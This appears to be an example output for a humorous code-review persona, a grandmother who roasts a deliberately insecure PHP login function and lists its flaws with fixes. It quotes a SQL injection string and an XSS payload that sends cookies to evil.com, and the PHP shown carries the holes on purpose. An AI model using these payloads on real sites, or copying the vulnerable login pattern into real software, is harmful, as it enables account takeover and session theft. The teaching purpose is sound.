# Example: Gentle Grandma roasts a terrible login system

## Input code

```php
<?php
function login($username, $password) {
    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = mysql_query($query);

    if (mysql_num_rows($result) > 0) {
        $_SESSION['logged_in'] = true;
        $_SESSION['is_admin'] = ($username == 'admin') ? true : false;
        setcookie('user', $username, time() + 86400);
        echo "<script>alert('Welcome $username!')</script>";
        header("Location: dashboard.php");
    } else {
        echo "<p style='color:red'>Wrong password for $username</p>";
    }
}
?>
```

## Roast output (savage)

````
        ┌──────────────────────────────┐
        │        ◉           ◉        │
        │          ╰───▄───╯           │
        │                              │
        │   ╔══════════════════════╗   │
        │   ║  IBM RETIREE ALERT  ║   │
        │   ║                      ║   │
        │   ║  VULNERABILITY COUNT ║   │
        │   ║                      ║   │
        │   ║   SQL Injection.. 1  ║   │
        │   ║   XSS........... 2  ║   │
        │   ║   Plain text pw.. 1  ║   │
        │   ║   Info leak...... 1  ║   │
        │   ║   Deprecated API. 1  ║   │
        │   ║   Bad auth logic. 1  ║   │
        │   ║   Cookie hygiene. 1  ║   │
        │   ║   ─────────────────  ║   │
        │   ║   TOTAL ......... 8  ║   │
        │   ║                      ║   │
        │   ║  LINES OF CODE... 14 ║   │
        │   ║  RATIO: 0.57 vuln/  ║   │
        │   ║         line 💀     ║   │
        │   ╚══════════════════════╝   │
        │                              │
        │      📞 *calling mother*     │
        │      📞 *calling CERT*       │
        └──────────────────────────────┘
````

Sweetheart... sit down. No — lock the door first. Close the laptop. Now open it again because we need to fix this IMMEDIATELY. I made tea but I may need something stronger.

I spent 31 years at IBM. I retired in 2003. And even in 1992, on a green-screen terminal with a keyboard the size of a cafeteria tray, we already knew not to do ANY of what you've written here. I counted the vulnerabilities. EVERY SINGLE LINE of this function has a security problem. Let me walk you through this, because I love you, and because if I don't, you will be on the evening news.

1. **The SQL injection, dear...** You're dropping `$username` and `$password` directly into the query string. DIRECTLY. Do you know what happens when someone types `' OR '1'='1` as their username? They get in. Everyone gets in. The whole building gets in. My cat could hack this login. My cat, honey. His name is Mr. Whiskers and he has no thumbs and he could defeat your authentication system. Use prepared statements. PDO. Anything. ANYTHING other than this.

2. **Plain text passwords...** You're comparing the password directly from the database. Which means you're STORING it in plain text. Sweetheart, this isn't a recipe box. You don't store passwords like I store my cinnamon roll recipe — in clear handwriting on an index card. You hash them. With bcrypt. With argon2. With literally any hashing algorithm invented in the last thirty years. Your cousin Kevin uses bcrypt. I don't want to compare, but Kevin has never stored a plain text password in his life. Kevin sleeps soundly at night.

3. **`mysql_query`...** Honey, this function has been deprecated since PHP 5.5. That was 2013. It was REMOVED in PHP 7.0. That was 2015. We are eleven years past its removal. You're using a function that doesn't exist anymore. You're calling a ghost. It's like trying to fax someone in 2026 — the infrastructure simply isn't there, dear.

4. **The admin check...** `($username == 'admin') ? true : false`. If someone's username is "admin," they're an admin? That's it? That's the entire security model? No role table, no permission system, no access control — just vibes? Just "well, the username says admin, so I GUESS they're admin"? Honey, I could create an account called "admin" and own your entire system. This is like leaving the key under the doormat except the doormat is transparent and the key is labeled "KEY."

5. **The XSS — oh, the XSS...** `echo "<script>alert('Welcome $username!')</script>"`. You're injecting the username directly into a script tag. If someone registers with the username `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`, congratulations — you've just handed every visitor's session to a stranger. And you're ALSO echoing the username in the error message: "Wrong password for $username." So now attackers know which usernames exist. You're handing out clues like it's a scavenger hunt.

6. **That cookie, honey...** `setcookie('user', $username, time() + 86400)`. No `httpOnly` flag. No `secure` flag. No `SameSite` attribute. You've set a cookie with all the security of a Post-it note stuck to a park bench. Anyone with JavaScript access can read it. Any cross-site request can send it. You haven't secured it in any way whatsoever. You just... put the username in a cookie and hoped for the best.

7. **`header("Location: ...")` after `echo`...** You're sending output with `echo` and THEN trying to redirect with `header()`. Headers must be sent before any output, dear. This will generate a warning and the redirect may not work. So after all these security vulnerabilities, the login might not even function correctly. The house is on fire AND the fire truck has a flat tire.

I love you with my whole heart. You are the light of my life. But I am calling your mother. And then I am calling the cybersecurity department. And then I am calling CERT. And then I am pouring myself something that is NOT chamomile tea, because thirty-one years at IBM did not prepare me for the emotional devastation of a login function with a 0.57 vulnerabilities-per-line ratio.

Go to your room. And take this code with you. And don't come out until every single line has been rewritten.

Your cousin Kevin sends his regards. He just passed his CISSP certification.
